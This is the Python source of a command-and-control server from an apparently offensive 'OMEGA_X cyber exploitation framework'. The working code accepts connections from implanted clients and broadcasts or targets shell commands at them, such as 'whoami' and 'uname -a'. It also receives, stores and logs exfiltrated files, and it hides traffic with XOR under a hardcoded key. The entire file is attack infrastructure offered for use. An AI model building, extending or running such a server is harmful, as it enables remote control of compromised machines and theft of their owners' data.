#!/usr/bin/env python3
"""
OMEGA_X TCP Server
==================

Advanced TCP server for OMEGA_X cyber exploitation framework.
Features secure communication, multi-client handling, and command distribution.

USAGE:
    python3 tcp_server.py --port <port> [--ssl] [--max-clients <num>]

FEATURES:
- Multi-client support with session management
- Secure SSL/TLS communication
- Command broadcasting and distribution
- Real-time client monitoring
- Data exfiltration handling
- Cross-platform compatibility

AUTHOR: OMEGA_X Development Team
"""

import socket
import ssl
import threading
import time
import os
import sys
import argparse
import json
import base64
import hashlib
from datetime import datetime
import select
import queue

# OMEGA_X imports
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from omega_launcher import Colors

class OMEGATCPClientHandler:
    """Handle individual client connections"""

    def __init__(self, server, client_socket, client_address, use_ssl=False):
        self.server = server
        self.client_socket = client_socket
        self.client_address = client_address
        self.use_ssl = use_ssl

        self.ssl_socket = None
        self.connected = True
        self.session_id = None
        self.client_info = {}
        self.last_heartbeat = datetime.now()

        # Client statistics
        self.stats = {
            'bytes_sent': 0,
            'bytes_received': 0,
            'commands_received': 0,
            'files_exfiltrated': 0,
            'connect_time': datetime.now()
        }

    def handle_client(self):
        """Main client handling loop"""
        try:
            # Setup SSL if enabled
            if self.use_ssl:
                context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
                # In production, load proper certificates
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                self.ssl_socket = context.wrap_socket(self.client_socket, server_side=True)
                connection = self.ssl_socket
            else:
                connection = self.client_socket

            # Perform handshake
            if self.perform_handshake(connection):
                print(f"{Colors.GREEN}✅ Client {self.client_address} authenticated (Session: {self.session_id}){Colors.ENDC}")

                # Add to server's client list
                self.server.add_client(self)

                # Main communication loop
                self.communication_loop(connection)

            else:
                print(f"{Colors.RED}❌ Client {self.client_address} handshake failed{Colors.ENDC}")

        except Exception as e:
            print(f"{Colors.RED}❌ Client {self.client_address} error: {e}{Colors.ENDC}")
        finally:
            self.disconnect()

    def perform_handshake(self, connection):
        """Perform client handshake"""
        try:
            # Receive handshake
            handshake = self.receive_message(connection)
            if not handshake or handshake.get('type') != 'handshake':
                return False

            self.session_id = handshake.get('session_id')
            self.client_info = handshake.get('client_info', {})
            capabilities = handshake.get('capabilities', [])

            print(f"{Colors.BLUE}🤝 Handshake from {self.client_info.get('hostname', 'unknown')} ({self.client_address}){Colors.ENDC}")

            # Send handshake acknowledgment
            ack = {
                'type': 'handshake_ack',
                'session_id': self.session_id,
                'server_info': {
                    'version': '2.0.0',
                    'capabilities': ['command_distribution', 'file_reception', 'monitoring']
                },
                'status': 'connected'
            }

            self.send_message(connection, ack)
            return True

        except Exception as e:
            print(f"{Colors.RED}❌ Handshake error: {e}{Colors.ENDC}")
            return False

    def communication_loop(self, connection):
        """Main communication loop with client"""
        while self.connected:
            try:
                # Check for timeout
                if (datetime.now() - self.last_heartbeat).seconds > 120:  # 2 minute timeout
                    print(f"{Colors.YELLOW}⚠️  Client {self.client_address} heartbeat timeout{Colors.ENDC}")
                    break

                # Non-blocking receive with timeout
                ready = select.select([connection], [], [], 1.0)
                if ready[0]:
                    message = self.receive_message(connection)
                    if message:
                        self.handle_message(message, connection)
                    else:
                        # Connection closed
                        break

            except Exception as e:
                print(f"{Colors.RED}❌ Communication error with {self.client_address}: {e}{Colors.ENDC}")
                break

    def handle_message(self, message, connection):
        """Handle incoming message from client"""
        msg_type = message.get('type')

        if msg_type == 'heartbeat':
            self.last_heartbeat = datetime.now()
            # Send heartbeat acknowledgment
            ack = {'type': 'heartbeat_ack', 'timestamp': datetime.now().isoformat()}
            self.send_message(connection, ack)

        elif msg_type == 'command_result':
            self.stats['commands_received'] += 1
            self.server.handle_command_result(message)

        elif msg_type == 'exfiltrate':
            self.stats['files_exfiltrated'] += 1
            self.handle_file_exfiltration(message)

        elif msg_type == 'disconnect':
            print(f"{Colors.YELLOW}🔌 Client {self.client_address} disconnecting{Colors.ENDC}")
            self.connected = False

        else:
            print(f"{Colors.BLUE}📨 Unknown message type from {self.client_address}: {msg_type}{Colors.ENDC}")

    def handle_file_exfiltration(self, message):
        """Handle file exfiltration from client"""
        try:
            file_info = message.get('file_info', {})
            filename = file_info.get('filename')
            encoded_data = file_info.get('data')

            if not filename or not encoded_data:
                print(f"{Colors.RED}❌ Invalid file exfiltration data{Colors.ENDC}")
                return

            # Decode and decompress file data
            import gzip
            decoded_data = base64.b64decode(encoded_data)
            file_data = gzip.decompress(decoded_data)

            # Save file
            exfil_dir = os.path.join(self.server.exfiltration_dir, self.session_id)
            os.makedirs(exfil_dir, exist_ok=True)

            file_path = os.path.join(exfil_dir, filename)
            with open(file_path, 'wb') as f:
                f.write(file_data)

            print(f"{Colors.GREEN}📁 File exfiltrated: {filename} ({len(file_data)} bytes) from {self.client_address}{Colors.ENDC}")

            # Log exfiltration
            self.server.log_exfiltration(self.session_id, filename, len(file_data))

        except Exception as e:
            print(f"{Colors.RED}❌ File exfiltration error: {e}{Colors.ENDC}")

    def send_message(self, connection, message):
        """Send JSON message with encryption"""
        try:
            # Serialize and encrypt message
            message_json = json.dumps(message)
            encrypted_message = self.encrypt_message(message_json)
            message_length = len(encrypted_message)

            # Send message length first (4 bytes)
            connection.send(message_length.to_bytes(4, byteorder='big'))

            # Send encrypted message
            connection.send(encrypted_message.encode())

            self.stats['bytes_sent'] += message_length + 4

        except Exception as e:
            print(f"{Colors.RED}❌ Send failed: {e}{Colors.ENDC}")
            raise

    def receive_message(self, connection):
        """Receive and decrypt JSON message"""
        try:
            # Receive message length (4 bytes)
            length_bytes = connection.recv(4)
            if not length_bytes:
                return None

            message_length = int.from_bytes(length_bytes, byteorder='big')

            # Receive encrypted message
            encrypted_message = connection.recv(message_length).decode()
            if not encrypted_message:
                return None

            # Decrypt and parse
            decrypted_message = self.decrypt_message(encrypted_message)
            message = json.loads(decrypted_message)

            self.stats['bytes_received'] += message_length + 4

            return message

        except Exception as e:
            print(f"{Colors.RED}❌ Receive failed: {e}{Colors.ENDC}")
            return None

    def encrypt_message(self, message):
        """Simple encryption for messages"""
        key = 'omega_x_secure_key_2024'  # Should match client
        encrypted = ""
        for i, char in enumerate(message):
            key_char = key[i % len(key)]
            encrypted += chr(ord(char) ^ ord(key_char))
        return base64.b64encode(encrypted.encode()).decode()

    def decrypt_message(self, encrypted_message):
        """Decrypt received message"""
        key = 'omega_x_secure_key_2024'
        decoded = base64.b64decode(encrypted_message).decode()
        decrypted = ""
        for i, char in enumerate(decoded):
            key_char = key[i % len(key)]
            decrypted += chr(ord(char) ^ ord(key_char))
        return decrypted

    def disconnect(self):
        """Disconnect client"""
        self.connected = False

        # Remove from server
        self.server.remove_client(self)

        # Close sockets
        try:
            if self.ssl_socket:
                self.ssl_socket.close()
            if self.client_socket:
                self.client_socket.close()
        except:
            pass

        print(f"{Colors.YELLOW}🔌 Client {self.client_address} disconnected{Colors.ENDC}")

class OMEGATCPServer:
    """Advanced TCP server for OMEGA_X operations"""

    def __init__(self, host='0.0.0.0', port=4444, use_ssl=False, max_clients=100):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.max_clients = max_clients

        self.server_socket = None
        self.ssl_context = None
        self.running = False

        # Client management
        self.clients = {}
        self.client_lock = threading.Lock()

        # Message queues
        self.command_queue = queue.Queue()
        self.broadcast_queue = queue.Queue()

        # Directories
        self.base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
        self.exfiltration_dir = os.path.join(self.base_dir, 'exfiltrated_data')
        self.log_dir = os.path.join(self.base_dir, 'server_logs')

        os.makedirs(self.exfiltration_dir, exist_ok=True)
        os.makedirs(self.log_dir, exist_ok=True)

        # Server statistics
        self.stats = {
            'start_time': datetime.now(),
            'total_clients': 0,
            'active_clients': 0,
            'commands_sent': 0,
            'files_received': 0
        }

    def start(self):
        """Start the TCP server"""
        try:
            print(f"{Colors.CYAN}╔══════════════════════════════════════════════════════════════╗{Colors.ENDC}")
            print(f"{Colors.CYAN}║{Colors.ENDC}                    {Colors.RED}🔗 OMEGA_X TCP SERVER 🔗{Colors.ENDC}                     {Colors.CYAN}║{Colors.ENDC}")
            print(f"{Colors.CYAN}║{Colors.ENDC}              {Colors.YELLOW}SECURE COMMAND & CONTROL SERVER{Colors.ENDC}               {Colors.CYAN}║{Colors.ENDC}")
            print(f"{Colors.CYAN}╚══════════════════════════════════════════════════════════════╝{Colors.ENDC}")

            print(f"{Colors.BLUE}📍 Starting server on {self.host}:{self.port}{Colors.ENDC}")
            print(f"{Colors.BLUE}🔒 SSL: {'Enabled' if self.use_ssl else 'Disabled'}{Colors.ENDC}")
            print(f"{Colors.BLUE}👥 Max clients: {self.max_clients}{Colors.ENDC}")
            print()

            # Create server socket
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(5)

            # Setup SSL context if enabled
            if self.use_ssl:
                self.setup_ssl()

            self.running = True

            # Start background threads
            threading.Thread(target=self.accept_clients, daemon=True).start()
            threading.Thread(target=self.command_dispatcher, daemon=True).start()
            threading.Thread(target=self.broadcast_handler, daemon=True).start()

            print(f"{Colors.GREEN}✅ Server started successfully{Colors.ENDC}")
            print(f"{Colors.YELLOW}Type 'help' for commands, 'stop' to shutdown{Colors.ENDC}")
            print()

            # Interactive console
            self.interactive_console()

        except Exception as e:
            print(f"{Colors.RED}❌ Failed to start server: {e}{Colors.ENDC}")
            sys.exit(1)

    def setup_ssl(self):
        """Setup SSL context"""
        try:
            self.ssl_context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
            # In production, load proper certificates
            self.ssl_context.check_hostname = False
            self.ssl_context.verify_mode = ssl.CERT_NONE
            print(f"{Colors.GREEN}🔒 SSL context configured{Colors.ENDC}")
        except Exception as e:
            print(f"{Colors.RED}❌ SSL setup failed: {e}{Colors.ENDC}")
            self.use_ssl = False

    def accept_clients(self):
        """Accept incoming client connections"""
        while self.running:
            try:
                client_socket, client_address = self.server_socket.accept()

                # Check client limit
                with self.client_lock:
                    if len(self.clients) >= self.max_clients:
                        print(f"{Colors.YELLOW}⚠️  Client limit reached, rejecting {client_address}{Colors.ENDC}")
                        client_socket.close()
                        continue

                print(f"{Colors.BLUE}🔗 New connection from {client_address}{Colors.ENDC}")

                # Create client handler
                client_handler = OMEGATCPClientHandler(
                    self, client_socket, client_address, self.use_ssl
                )

                # Start client thread
                client_thread = threading.Thread(target=client_handler.handle_client, daemon=True)
                client_thread.start()

            except Exception as e:
                if self.running:  # Only print error if server is still running
                    print(f"{Colors.RED}❌ Accept error: {e}{Colors.ENDC}")

    def add_client(self, client_handler):
        """Add client to active clients list"""
        with self.client_lock:
            self.clients[client_handler.session_id] = client_handler
            self.stats['active_clients'] = len(self.clients)
            self.stats['total_clients'] += 1

        print(f"{Colors.GREEN}➕ Client added: {client_handler.session_id} ({len(self.clients)} active){Colors.ENDC}")

    def remove_client(self, client_handler):
        """Remove client from active clients list"""
        with self.client_lock:
            if client_handler.session_id in self.clients:
                del self.clients[client_handler.session_id]
                self.stats['active_clients'] = len(self.clients)

        print(f"{Colors.YELLOW}➖ Client removed: {client_handler.session_id} ({len(self.clients)} active){Colors.ENDC}")

    def command_dispatcher(self):
        """Dispatch commands to clients"""
        while self.running:
            try:
                command_data = self.command_queue.get(timeout=1.0)
                if command_data:
                    self.send_command_to_client(command_data)
                self.command_queue.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                print(f"{Colors.RED}❌ Command dispatcher error: {e}{Colors.ENDC}")

    def broadcast_handler(self):
        """Handle broadcast messages"""
        while self.running:
            try:
                broadcast_data = self.broadcast_queue.get(timeout=1.0)
                if broadcast_data:
                    self.broadcast_to_clients(broadcast_data)
                self.broadcast_queue.task_done()
            except queue.Empty:
                continue
            except Exception as e:
                print(f"{Colors.RED}❌ Broadcast handler error: {e}{Colors.ENDC}")

    def send_command(self, session_id, command):
        """Send command to specific client"""
        command_data = {'session_id': session_id, 'command': command}
        self.command_queue.put(command_data)

    def send_command_to_client(self, command_data):
        """Send command to specific client"""
        session_id = command_data['session_id']
        command = command_data['command']

        with self.client_lock:
            if session_id in self.clients:
                client = self.clients[session_id]

                message = {
                    'type': 'command',
                    'session_id': session_id,
                    'command': command,
                    'timestamp': datetime.now().isoformat()
                }

                try:
                    connection = client.ssl_socket if client.use_ssl else client.client_socket
                    client.send_message(connection, message)
                    self.stats['commands_sent'] += 1
                    print(f"{Colors.BLUE}📤 Command sent to {session_id}: {command}{Colors.ENDC}")
                except Exception as e:
                    print(f"{Colors.RED}❌ Failed to send command to {session_id}: {e}{Colors.ENDC}")
            else:
                print(f"{Colors.YELLOW}⚠️  Client {session_id} not found{Colors.ENDC}")

    def broadcast_command(self, command):
        """Broadcast command to all clients"""
        broadcast_data = {'command': command}
        self.broadcast_queue.put(broadcast_data)

    def broadcast_to_clients(self, broadcast_data):
        """Broadcast message to all clients"""
        command = broadcast_data['command']

        with self.client_lock:
            for session_id, client in self.clients.items():
                message = {
                    'type': 'command',
                    'session_id': session_id,
                    'command': command,
                    'timestamp': datetime.now().isoformat()
                }

                try:
                    connection = client.ssl_socket if client.use_ssl else client.client_socket
                    client.send_message(connection, message)
                    self.stats['commands_sent'] += 1
                except Exception as e:
                    print(f"{Colors.RED}❌ Failed to broadcast to {session_id}: {e}{Colors.ENDC}")

        print(f"{Colors.BLUE}📢 Command broadcasted to {len(self.clients)} clients: {command}{Colors.ENDC}")

    def handle_command_result(self, result_message):
        """Handle command result from client"""
        session_id = result_message.get('session_id')
        command = result_message.get('command')
        result = result_message.get('result', {})

        print(f"{Colors.GREEN}📨 Result from {session_id}:{Colors.ENDC}")
        print(f"{Colors.BLUE}Command: {command}{Colors.ENDC}")

        if result.get('success'):
            if result.get('output'):
                print(f"{Colors.GREEN}Output:{Colors.ENDC}")
                print(result['output'])
        else:
            print(f"{Colors.RED}Error: {result.get('error', 'Unknown error')}{Colors.ENDC}")

        # Log result
        self.log_command_result(session_id, command, result)

    def log_command_result(self, session_id, command, result):
        """Log command execution result"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'session_id': session_id,
            'command': command,
            'success': result.get('success', False),
            'output_length': len(result.get('output', '')),
            'error': result.get('error', '')
        }

        log_file = os.path.join(self.log_dir, 'command_results.jsonl')
        with open(log_file, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

    def log_exfiltration(self, session_id, filename, file_size):
        """Log file exfiltration"""
        log_entry = {
            'timestamp': datetime.now().isoformat(),
            'session_id': session_id,
            'filename': filename,
            'file_size': file_size
        }

        log_file = os.path.join(self.log_dir, 'exfiltrations.jsonl')
        with open(log_file, 'a') as f:
            f.write(json.dumps(log_entry) + '\n')

    def show_clients(self):
        """Show connected clients"""
        print(f"{Colors.BLUE}Active Clients ({len(self.clients)}):{Colors.ENDC}")
        print("-" * 80)

        with self.client_lock:
            if not self.clients:
                print("No active clients")
                return

            for session_id, client in self.clients.items():
                uptime = datetime.now() - client.stats['connect_time']
                print(f"Session: {session_id}")
                print(f"  Address: {client.client_address}")
                print(f"  Hostname: {client.client_info.get('hostname', 'unknown')}")
                print(f"  Platform: {client.client_info.get('platform', 'unknown')}")
                print(f"  Uptime: {str(uptime).split('.')[0]}")
                print(f"  Commands: {client.stats['commands_received']}")
                print(f"  Files: {client.stats['files_exfiltrated']}")
                print()

    def show_stats(self):
        """Show server statistics"""
        uptime = datetime.now() - self.stats['start_time']

        print(f"{Colors.BLUE}Server Statistics:{Colors.ENDC}")
        print(f"  Uptime: {str(uptime).split('.')[0]}")
        print(f"  Total Clients: {self.stats['total_clients']}")
        print(f"  Active Clients: {self.stats['active_clients']}")
        print(f"  Commands Sent: {self.stats['commands_sent']}")
        print(f"  Files Received: {self.stats['files_received']}")

    def interactive_console(self):
        """Interactive server console"""
        while self.running:
            try:
                command = input(f"{Colors.GREEN}OMEGA_SERVER>{Colors.ENDC} ").strip()

                if not command:
                    continue

                if command.lower() in ['exit', 'stop', 'quit']:
                    self.stop()
                    break

                if command.lower() == 'help':
                    self.show_help()
                    continue

                if command.lower() == 'clients':
                    self.show_clients()
                    continue

                if command.lower() == 'stats':
                    self.show_stats()
                    continue

                if command.lower().startswith('cmd '):
                    # Send command to all clients
                    cmd = command[4:].strip()
                    if cmd:
                        self.broadcast_command(cmd)
                    continue

                if command.lower().startswith('cmdto '):
                    # Send command to specific client
                    parts = command[6:].split(' ', 1)
                    if len(parts) == 2:
                        session_id, cmd = parts
                        self.send_command(session_id, cmd)
                    else:
                        print(f"{Colors.YELLOW}Usage: cmdto <session_id> <command>{Colors.ENDC}")
                    continue

                # Unknown command
                print(f"{Colors.YELLOW}Unknown command. Type 'help' for available commands.{Colors.ENDC}")

            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}⚠️  Use 'stop' to shutdown server{Colors.ENDC}")
            except Exception as e:
                print(f"{Colors.RED}❌ Console error: {e}{Colors.ENDC}")

    def show_help(self):
        """Show available commands"""
        help_text = """
OMEGA_X TCP Server Commands:
============================

Server Control:
  help              Show this help
  exit/stop/quit    Shutdown server

Client Management:
  clients           Show active clients
  stats             Show server statistics

Command Distribution:
  cmd <command>     Send command to all clients
  cmdto <id> <cmd>  Send command to specific client

Examples:
  clients
  stats
  cmd whoami
  cmdto abc123 uname -a
"""
        print(help_text)

    def stop(self):
        """Stop the server"""
        print(f"{Colors.YELLOW}🛑 Shutting down OMEGA_X TCP Server...{Colors.ENDC}")

        self.running = False

        # Disconnect all clients
        with self.client_lock:
            for client in list(self.clients.values()):
                client.disconnect()

        # Close server socket
        if self.server_socket:
            self.server_socket.close()

        print(f"{Colors.GREEN}✅ Server shutdown complete{Colors.ENDC}")

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="OMEGA_X TCP Server")
    parser.add_argument('--host', default='0.0.0.0', help='Server bind address (default: 0.0.0.0)')
    parser.add_argument('--port', type=int, default=4444, help='Server port (default: 4444)')
    parser.add_argument('--ssl', action='store_true', help='Enable SSL/TLS')
    parser.add_argument('--max-clients', type=int, default=100, help='Maximum number of clients (default: 100)')

    args = parser.parse_args()

    # Create and start server
    server = OMEGATCPServer(
        host=args.host,
        port=args.port,
        use_ssl=args.ssl,
        max_clients=args.max_clients
    )

    try:
        server.start()
    except KeyboardInterrupt:
        server.stop()
    except Exception as e:
        print(f"{Colors.RED}❌ Server error: {e}{Colors.ENDC}")
        sys.exit(1)

if __name__ == "__main__":
    main()